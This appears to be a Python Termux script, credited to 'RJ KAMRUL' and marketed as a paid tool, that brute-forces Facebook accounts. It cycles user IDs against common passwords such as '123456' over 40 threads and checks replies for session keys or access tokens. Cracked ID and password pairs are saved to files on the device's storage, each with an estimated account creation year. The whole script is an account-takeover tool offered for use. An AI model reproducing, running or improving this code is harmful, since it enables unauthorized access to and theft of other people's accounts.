...
RJ KAMRUL="""
 ...
 ===================================================================
 TOOL OWNER : RJ KAMRUL 
 FACEBOOK : KAMRUL HASAN MAHI
 GITHUB : KAMRUL-520
 ===================================================================
"""
...
sys.stdout.write('\x1b]2; 𓆩🀪💚【KAMRUL᭄】㊝𓆪 🔥 \x07')

def request_storage_permission():
    try:
        open('/sdcard/@RJKAMRUL', 'w').write(' ')
    except Exception as e:
        print(e)
        print('\x1b[1;93m Allow Termux Permissions! And Run Again ')
        os.system('termux-setup-storage')

directories = ['/sdcard/KAMRUL', '/sdcard/RJ-KAMRUL', '/sdcard/KAMRUL/RJ-KAMRUL']
...
def Banner():
    if 'Linux' in sys.platform.capitalize():
        ...
        os.system('cls')
    return '\n   \x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████  \n   \x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  \n   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ \n   \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92RJEVELOPER \x1b[1;91m :   \x1b[1;92mRJ-KAMRUL\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92m𝐓𝐄𝐀𝐌-𝐂𝐘𝐁𝐄𝐑-𝟎𝟑\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mPAID✔️\n   \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92m12.00\n   \x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'

attemps = 0
while attemps < 12345677901:
    username = input(' \x1b[0;92mEnter Username: ')
    password = input(' \x1b[0;93mEnter Password: ')
    if username == 'KAMRUL' and password == 'BOOS':
...
def creationyear(uid):
    if len(uid) == 15:
        if uid[:10] in ('1000000000',): RJ_dgk = '2009'
        elif uid[:9] in ('100000000',): RJ_dgk = '2009'
        elif uid[:8] in ('10000000',): RJ_dgk = '2009'
        elif uid[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'): RJ_dgk = '2009'
        elif uid[:7] in ('1000006', '1000007', '1000008', '1000009'): RJ_dgk = '2010'
        elif uid[:6] in ('100001',): RJ_dgk = '2010'
        elif uid[:6] in ('100002', '100003'): RJ_dgk = '2011'
        elif uid[:6] in ('100004',): RJ_dgk = '2012'
        elif uid[:6] in ('100005', '100006'): RJ_dgk = '2013'
        elif uid[:6] in ('100007', '100008'): RJ_dgk = '2014'
        elif uid[:6] in ('100009',): RJ_dgk = '2015'
        elif uid[:5] in ('10001',): RJ_dgk = '2016'
        elif uid[:5] in ('10002',): RJ_dgk = '2017'
        elif uid[:5] in ('10003',): RJ_dgk = '2018'
        elif uid[:5] in ('10004',): RJ_dgk = '2019'
        elif uid[:5] in ('10005',): RJ_dgk = '2020'
        elif uid[:5] in ('10006',): RJ_dgk = '2021'
        elif uid[:5] in ('10009',): RJ_dgk = '2023'
        elif uid[:5] in ('10007', '10008'): RJ_dgk = '2022'
        else: RJ_dgk = ''
    elif len(uid) in (9, 10): RJ_dgk = '2008'
    elif len(uid) == 8: RJ_dgk = '2007'
    elif len(uid) == 7: RJ_dgk = '2006'
    elif len(uid) == 14 and uid[:2] in ('61',): RJ_dgk = '2024'
    else: RJ_dgk = ''
    return RJ_dgk

def ua2():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWKAMRUL')
    ...
    try:
        ...
        for pw in ['123456', '1234567', '12345678', '123456789', '111111', '000000', '654321', '1234567890']:
            ...
            if 'session_key' in response or 'EAAA' in str(response):
                with open('/sdcard/KAMRUL_old.txt', 'a') as file:
                    file.write(f'[KAMRUL-OK🌺] {uid}|{pw}|{creationyear(uid)}')
                line()
                print(f'\r{xy1}{G} [KAMRUL-OK🌺] {uid} | {pw} | {creationyear(uid)}')
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
                print(f'\r{x}{Y} PROFILE LINK {G}➤{G} {ProfileLink}')
                line()
                open('/sdcard/KAMRUL/OLD-UID/KAMRUL_old_uid_ok.txt', 'a').write(f'[RJ-OK] {uid} | {pw} | {creationyear(uid)}\n')
...
def main():
    ...
    with ThreadPool(max_workers=40) as pool:
        pool.map(login, [RJKAMRUL + uid for uid in user_ids])
    print()
    line()
